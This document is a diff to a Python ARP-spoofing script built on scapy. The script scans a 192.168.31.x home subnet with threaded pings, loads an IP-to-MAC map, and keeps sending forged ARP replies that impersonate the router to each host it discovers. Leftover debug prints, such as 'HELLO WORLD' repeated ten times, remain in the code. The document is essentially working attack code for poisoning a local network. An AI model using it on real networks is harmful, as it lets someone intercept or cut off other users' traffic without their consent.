@@ -8,8 +8,7 @@ import itertools
 router_ip = "192.168.31.1"
 target_ip = "192.168.31.219"
 target_mac = "e0:9d:31:de:a2:ba"
-src_mac    = 'ab:ab:ab:ab:ab:ab'
-
+src_mac    = 'ab:ab:ab:ab:ab:ab' 
 
 class IPMap:
 
@@ -24,6 +23,7 @@ class IPMap:
 
         self.map.append((ip, mac))
         self.ips.append(ip)
+        print("Added",ip)
 
     def next(self):
         if len(self.map) == 0:
@@ -39,7 +39,7 @@ class IPMap:
 def ip_exists(ip):
     try:
         print("Checking {}".format(ip))
-        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=1,
+        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=2,
                        stdout=open('/tmp/null', 'w'))
         return True
     except:
@@ -72,30 +72,52 @@ def send_arp_poison(router_ip, target_ip, target_mac, src_mac="ab:ab:ab:ab:ab:ab
     packet = all.ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac, hwsrc=src_mac)
     all.send(packet)
 
+def check_ip(ip):
+    if not ip_exists(ip):
+        return
+    mac = get_mac_addr(ip)
+    if mac is not False:
+        ip2mac.add_addr(ip, mac)
+        print("{} recognized as {}".format(ip, mac))
+
 def feed_ipmap():
     ip_addresses = get_all_possible_ip('192.168.31.29')
     for ip in ip_addresses:
-        if not ip_exists(ip):
-            continue
-        mac = get_mac_addr(ip)
-        if mac is not False:
-            ip2mac.add_addr(ip, mac)
-            print("{} recognized as {}".format(ip, mac))
+        if threading.active_count() > 50:
+            time.sleep(3)
+        thread = threading.Thread(target=check_ip, args=[ip], daemon=True)
+        thread.start()
+
+def infinite_feeding():
+    while True:
+        feed_ipmap()
+        time.sleep(5)
 
 def main():
 
     while True:
         ip, mac = ip2mac.next()
+        print(ip)
         if not ip:
+            time.sleep(.3)
             continue
         print("[*] Poisoning {}".format(ip))
+        print("HELLO WORLD\n"*10)
         send_arp_poison(router_ip, target_ip=ip, target_mac=mac) 
         time.sleep(.3)
 
 ip2mac = IPMap()
+locker = threading.Lock()
 
-scanner_thread = threading.Thread(target=feed_ipmap)
+dic = json.load(open('ip2mac-new.json','r'))
+for ip, mac in dic.items():
+    ip2mac.add_addr(ip, mac)
+
+main_thread = threading.Thread(target=main)
+main_thread.start()
+
+scanner_thread = threading.Thread(target=infinite_feeding)
 scanner_thread.start()
-main()
+
 
 
